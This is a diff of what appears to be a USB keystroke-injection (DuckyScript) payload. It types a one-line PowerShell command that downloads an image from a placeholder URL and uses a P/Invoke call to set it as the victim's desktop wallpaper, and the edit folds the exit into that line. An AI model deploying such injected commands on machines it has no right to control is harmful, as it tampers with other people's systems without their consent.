@@ -8,8 +8,5 @@ ENTER
 DELAY 2000
 REM One line command to create a powershell function to change wallpaper, then call it
 REM Don't forget to change path to the picture, which will be saved in Downloads folder
-STRING wget "http://LinkToPicture" -outfile "~/Downloads/setWPRD.jpg";Function Set-WallPaper($Image) {Add-Type -TypeDefinition  'using System; using System.Runtime.InteropServices; public class Params{[DllImport("User32.dll",CharSet=CharSet.Unicode)] public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);}'; $SPI_SETDESKWALLPAPER = 0x0014; $UpdateIniFile = 0x01; $SendChangeEvent = 0x02; $fWinIni = $UpdateIniFile -bor $SendChangeEvent; $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)} ; Set-WallPaper -Image ~/Downloads/setWPRD.jpg
-TAB
-DELAY 200
-STRING ; exit
+STRING cd ~ ; wget "http://LinkToPicture" -outfile "setWPRD.jpg";Function Set-WallPaper($Image) {Add-Type -TypeDefinition  'using System; using System.Runtime.InteropServices; public class Params{[DllImport("User32.dll",CharSet=CharSet.Unicode)] public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);}'; $SPI_SETDESKWALLPAPER = 0x0014; $UpdateIniFile = 0x01; $SendChangeEvent = 0x02; $fWinIni = $UpdateIniFile -bor $SendChangeEvent; $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)} ; Set-WallPaper -Image setWPRD.jpg ; exit
 ENTER
